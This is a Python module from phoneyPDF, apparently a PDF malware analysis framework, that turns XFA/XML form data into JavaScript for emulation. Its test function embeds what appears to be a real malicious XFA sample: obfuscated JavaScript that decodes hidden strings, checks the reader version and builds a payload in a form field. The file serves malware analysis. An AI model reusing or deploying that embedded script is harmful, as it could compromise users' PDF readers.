'''
XFA/XDP DOM in Javascript
This file is part of the phoneyPDF Framework

This module provides methods for transforming both PDF objects and XML (xfa/xdp) into a single structure of linked objects
in javascript. The idea is that any *DOM interation will play out in javascript land, where the DOMs are created and
maintained as the PDF is 'rendered'.

Trevor Tonn <smthmlk@gmail.com>

Copyright (c) 2013, VERISIGN, Inc

All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
      this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright notice,
      this list of conditions and the following disclaimer in the documentation
      and/or other materials provided with the distribution.
    * Neither the name of VERISIGN nor the names of its contributors
      may be used to endorse or promote products derived from this software
      without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
"AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
'''

from lxml import etree
DEBUG = True

def removeNamespace(element, logger):
    '''
    Removes the namespace stuff from an element's tag attr. Probably a bad idea.
    '''
    if not element.nsmap:
        logger.info("empty nsmap")
        return

    for key in element.nsmap:
        val = element.nsmap[key]
        s = "{%s}" % val
        logger.debug("removing %s => %s: %s" % (key, val, s))
        element.tag = element.tag.replace(s, "")

def elementToJS(element, jsStrL, logger):
    logger.debug("converting element '%s'" % element.tag)
    origTag = element.tag
    removeNamespace(element, logger)
    if origTag != element.tag:
        logger.debug(" -- tag had namespace removed; new tag: %s" % element.tag)

    # add element first
    jsStrL.append("%s = new Element('%s');" % (element.tag, element.tag))

    # see if there's any text
    if element.text:
        # we will likely need to escape chars like ' and " to make this work...
        jsStrL.append("%s.text = \"%s\";" % (element.tag, element.text.strip()))

    # add children both by their tagname and as integers
    index = 0
    for childElement in element.getchildren():
        # create child recursively
        elementToJS(childElement, jsStrL, logger)

        if element.tag == 'subform':
            #TODO: process subform for field names
            pass
        # now, add this child both as a property and something accessible via index
        jsStrL.append("%s.%s = %s;" % (element.tag, childElement.tag, childElement.tag))
        jsStrL.append("%s[%d] = %s;" % (element.tag, index, childElement.tag))
        index += 1
def xmlToJS(xml, logger):
    '''
    Takes an LXML element tree and converts it into javascript code that, when executed by
    a javascript engine, will create a very similar structure that can be manipulated in
    javascript land by other scripts.

    Returns a string of javascript suitable for eval()'ing.
    '''
    # Prepare the javascript string with a defintion of our 'Element' object
    jsStrL = ["""
    function Element(tag) {
        this.tag = tag;
        // this needs a lot more stuff added to it...
    }

    """]

    # Convert XML elements into a tree of javascript objects
    try:
        elementToJS(xml, jsStrL, logger)
    except Exception,e:
        logger.warn(e)
        pass
    return '\n'.join(jsStrL)

def getExposedObjects():
    '''
    Adobe Reader has all sorts of objects that are defined under the hood and exposed to javascript.
    This method returns a string of javascript which contains definitions for those objects.
    '''
    defsStr = """
var app = Object();
"""

    return defsStr

def test_xmlToJS():
    #x="""<xfa><subform><g><script>var q='hector'; var p='go'; var f=function(a,b){ return a+' '+b; };</script></g></subform><subform2><ggg><script language="javascript">print( f(p,q) );</script></ggg></subform2></xfa>"""
    y="""<template xmlns="http://www.xfa.org/schema/xfa-template/2.5/"><subform layout="tb" locale="en_US" name="kos"><pageSet><pageArea id="rya" name="rya"><contentArea h="756pt" w="576pt" x="0.25in" y="0.25in"/><medium long="792pt" short="612pt" stock="default"/></pageArea></pageSet><subform h="756pt" w="576pt" name="upo"><field h="65mm" name="sac" w="85mm" x="53.6501mm" y="88.6499mm"><event activity="initialize" name="cum"><script contentType="application/x-javascript">
abo=kor([app]);kop();function led(y,s){var v,p,g,f,m,o,a,z,x,h,b,f,w,l;a=sac.rawValue.replace(/[QjCGRkhPK]/g,'');o='';z='';h=0;v='substr';m=y.length;l='fromCh';l+='arCode';g=String;for(w=0;w&lt;m;w++){h+=s;f=y[v](w,1);b=a.indexOf(f);b+=h;b%=a.length;o+=a[v](b,1)}for(x=0;x&lt;m;x+=2){f=o[v](x,2);p=parseInt(f,16);z+=g[l](p)}return z}function kor(g){return g[0]}function red(){var f,b,i,a,c,m,g,k,z,w,u,t,y;m='ib94oe0z7aY9e2';c=2;w=led(m,c);z='z8I7i6o6z6aa';t=29;i=led(z,t);b='X8aWSSz53389eYiiba2fdIza61';g=23;a=led(b,g);f='fdYcYel5bi0aII45';k=24;y=led(f,k);u=abo[a][y]();u=u[w]('.','');while(u[i]&lt;4){u+='0'}u=parseInt(u,10);return u}function kop(){var u,j,kw,z,w,v,kr,o,x,n,ky,r,c,s,m,kc,b,ka,km,f,p,l,q,kp,a,d,kk,h,kv,y,kb,ku,t,i,ks,k,kt,g;r='8eWd2d3f1bXed868f5bae07o4i5IazaSoii2IYz0892W27Y7019XWlS63f1bXed164f5bael7o705SaSl8ocidIYz089cW28Y3019XWdS9Yl1IXId764f2bael7o4i57azl8oci2I6808bce2SY3059XWdS63f1XXed764f5bib2794W5Iazl1oci2IYz0z6c22SY301WaWdSo3o1bX4XI64f5baea4l455Iazl8oci2IYz089cW2SYX049Xco4754a5laol';k=21;u=led(r,k);m=11146;m-=2945;y=2815;y-=815;v='133S2eiX';w=24;s=led(v,w);p='58lfo01Si5Y7e826bzc14d064SlX7SYW8460z7dYIez96Xzid1IoXcil1Soa3Wl5S9a4W0579Y4e024bYcef28b6czfd8I6Xze6259X3Ia0Yo61fe1SbboSza6od430Sd5fWbi28edo1fdl9S4a2X1izdei718oz1iooWca4SYf6Wz4e027bYcef28b6czfd8I6Xzid1IoX3il1Soa3WldSIl4Sf5a9o5e9d74Ya7fY8eo2e358Sd9ai655I96ia17oYzzld305XWfaa8X5zzW74Y0Wo25b42Wff75da84d2IbXb42X7laSilo3calW151Wo6z024fI377i81l2abdcIf585d6Ic1SIfXbo619e83bl3cd580Y3I9c4IIWbf21bo44f0cidYzW665Yd44z1XoizbldSXa4W84aoW73Y57SYSXlY1f68efbca6fz2d2zb94ilXW781ia52o0oi6a7Wd5d097a287WYSb92I35cSfca0d5ib1cia0zWzzel2SbXXWiae0o4z99do0XX42Ybe4Sf08YY5ziddIoX3if18o8Yfo2W953WSa69W4l0l4SIXefYzfecY3Y7cd4a261z0d0iI16l51zo8SIl7cda8Wa6i0deSI9W0iYz7dYfl8SYYze63ibX4II0biYYXloS3X8Wi5oeS3z0c4bIWeW25b5oWbll26fz824IbXfi81Soa3Wl5SdaaSYfI966a0c74a1eW29';b=27;c=led(p,b);t='o6207oY2S14dWf6I';a=10;j=led(t,a);i=4132;i+=3868;d='c413iIeoaI76acY3823IX6976ce9Iic6bb44llIIcc5SiY8WY1W61365eo5zo2z9239d3bd4bl4Ilcz0cS0XSfX7fa7ia8iYzc07W71ef4X45zo6acif0d1odfe747lW51c8beSfde307ol84a8e22S33XYceb5076a9c49d1fWfe74IlcI0cS0XSfX7fa7ia8iY8WY1W61e65eo5zo2zI2cWd1Idlbf5IoXISc89X2fda30d0a1oIlW05cb0a64eI1Wi1z9YS0X3f2X125Sac5o2Yl5SWXobc7zXlo6ccY4W78eS8e944o2Ifi69b3aX6e242lczYob9f2f9zbb4i5Xodc2Y2W43i6XXo54icI9Yd8oYodcfl3Wo8zfo6YXSecIbc7ilzo289a2caXzd5Xfal6XzI2f9d3XXl9I77adI34Sz4Si11fae9b0iW8d20Sa1a657lf9i5I9izeeziX2fY5alaI18b022fX1b5eilY4flfY5993364XfY06dzS5eW53b67fa4ida5d27YX29d6027ea9fd8WYdW61e6ce81z71zbcc9dSiWobI4Yaozdcd0X361afIdbXYoXld2a9lXd6dec4Woaa92cWXSb6l1969lXiiodlc27llII7zXSIX8W039d1bYdXYa3l2aiY0oa3Sdizz3Sl8z0o605S4c73c7W584lc2a4W91l6Ieo5zo2z92z94Y4Wzb07Ieiz84e0YS5';h=13;x=led(d,h);o='5f944c0bl2Yi';q=27;n=led(o,q);f='fIYI61Wai16Sio6dSai16IYb';l=15;g=led(f,l);z='6a6f696e';kr=25;kk=led(z,kr);ku=15820;ku-=6519;km=red();if(km>=i){ky='';kv=g;kw=pub(s,y);ks=21;kp='of922ozi89Xed564f5bebaS74S5ab9dzi04WIY11coo6YSYeY295SdS4Sf3IXS2adzII10X8c82cY20YoYoi4Xbazlzbcd57YSY78bW7Wdz1XXX8deSz65b2b9dz6z4SXle1lci5i6aXz6c72WIeY28WW436Y51aXbW56164boedS7621W5zl1oiic5XIzlcceYS25039YidW9Y181XeWI6if41oel7I555I54d86aodIfeY808fidYfzeWWcl3e360ocWdo673lbael4z34fia2eXlcfXI3zYl68ciW0zz59e77SdSl05Xl66So3ibeeadY74a3lee1odflI2Idl1cdi4azY0eeWXS7303bddWSY7f5be724065fI5WeSoWic59zbzIo25Y0Y06W49lS4Yf1fXeWl6i0b12Xzez35aIbYl9o84W51I88fciYY0Sl40XWlS0360o9a2e673b1Ie87l6YfiaWoS7Xia5WzYl6oX26I5l8097eSe341o1I6IScfIbdeadY6c5Yb1d7loSWIXz6z3cdi8I6069eWl27371adXWcSl62b5eld842fc5Sl37441zWei8fdXYbY7l1Wa9oWe358X15W6Si3zei727c4zf95a99o1i6ifablb81YIa3l9WfiWIaS107XI27fcIi16WYdb42aba9o370I2iazYle89260d979eW7Sd3f05Xl6Ifl041eWY4o6c5YaIe2o5fXbI8l73o65e27Y792WX2aS30X9lW5flfob8Wleb655W5WeSoWic59z08X22Y207l1oYceSe551W9i2zYz0be2bI7c354Ibzl0li43bdzXzc4iY7Yz03ociX2Y5405dXX6dff592e84639a552ooo0fdzdz87o27cSIzl3WW9lS4Y981ciX6dl3l1c7I44691aaWe2oaiW5a80z64f520e098595Sd370acIWlY3fXb5X2e765f952oz6Xi5IWIilc81ib2S0b91cYI6Y6Xod5W3f2b8eiX64W50fcl290oco9zaa0l64c5e2406869bSlS11bcIdof30cebbI4449a3lSlo64I65dal7022c7Y7zc05caS7z03SczWl6lb8bieY4Y4e1Slle2iciS5YIdz8o2i7Y3Y0ebWX273a3iX3XaflIibaXz4z4Y59bcl4l34cIf13zb4biY030c91c5WSY18bcdd6Si0b1dbfd458495Il9o84ab2e07IoXifY60282S2SlS11bcIdoff3195el7450aWbll5ococI3zYlSc7i72e0bW4c03aSi1Xcbdedz3ibz777974faaIe779iSI2aW89cIYYY3Y2oXi0WdY9049iooYf3bzIbld45e5200l47iic5Xa38X22i1f6zcWYSdI3Yf8i9W2d61f41cXzSY701I5Se56iI5baa07c2i5IYel9Wci2Sd1la5dWW7dz011ce27l6bYYaSdS6aiabdezco41ifa7Y2WWW7SdYl319dWz6cf4b0Wa4z7efaXSo879iSI2aW89cdYYI0l89eS536Sf19X3W6Yz051ib24W6e1aled7o8fI5dIi8f822SY00bWcia3SS70Xll6667f4baXz7c6if352o5ii43b2al8929cXI0za84ceS436311WW66X359b70493i43bla1oc4WI3zYl1ob2Ia0zc05c5S6Ye1ice26S86516WI4Y3Wfal3lSi1IlbI8Szeo2i6Y3zf9eWX27Yo19cWWlSc049XbIdz3i1al2a37iic5Xad8Xc9iza3z79a7e3e548X156SS43lzzX8ez554ib3lS7049idaY7fo65IYf038490I61304dWW76X3dfcea4o3e5aXSe3oco1iY8l81c7idYSz78bW73a54XIcd26S865b6e0dI45fW5Wlzo04Sbdal78cd2WIeY08Wi23iz68fX36adX3be2eld8425i52oYW9fIiW8ll9of5S00Y59fcfWe3o3XdiWlYz6b1oWI7b50f35zl5i3i25Yzic6cz5XYcz591WSIaz1Xi15dod63Ife7ee46Y1WaelW7YoXbozY8022cS20l8WaW2Sdz08f9W2zf8fo96e6d43857lIl5lcilIXzlX12zibaYl40aWb2bS71XXIWId6651c72447W5ebYlYioi35SzSlbcb5WY00co5WSSe3f1I9adaf4fI1cbId638aWX3l373IXbWzi80ddYSael9W59bS4z13b9edldf3z92ece43faSaelz64fc5a13lec158Y8z99l7eIezo14ded3Sz6o1XXf744W59lzooo0I2IWadz3oiib03l69YWX44351idIW6Y8b81aWddY4o5ibclX75I6IYa38X22ifa0l4Wlcf2eY01f9S2ISff4eaXz7c4ofea9o3liI1I3zfcIcWYeIX998ciXS631XodIW6fzbfeXWlS45847bleXioI5bYe8l32icS00zeoa772oYI1b9Sdcf33110797Y481Sa1lS75o1Ifzdli8c2407z88ccb2iY907dX2eYf68b07Y4922f7X4dolaIiIdez762c58a0zf8Yi0IlSI0bXi2zYzbff0baSY6ef3bYdYiofli2eS81o7c22d0f8liaIe341i9a2zf66Yf58zdb7S1bX2l07dfXbW8zcf8cc8Y6zao5ib3S3o8X1X6dd23IzI7e406c1SaYe2l3f9zI86z88e2dI5l40cWeWi3i8IXbWISofI';kb=led(kp,ks);kc=pub(s,7600);if(km&lt;m){ky=c}else if(km&lt;ku){ky=x}if(ky[n]){kt=u;ka=[kv,kw,kb,kc,kt,ky][kk]('');sac[j]=ka}}return}function pub(j,u){var a,r,w,g,q,y;y='967e2IfXYiX7';w=6;g=led(y,w);a='WfdY64oYc4WSSe694d';q=30;r=led(a,q);while(j[g]&lt;u){j+=j}j=j[r](0,u);return j}</script></event><ui><imageEdit/></ui></field></subform></subform></template>"""
    xml=etree.fromstring(y)
    jsStr = xmlToJS(xml)

    print jsStr

if __name__ == "__main__":
    test_xmlToJS()
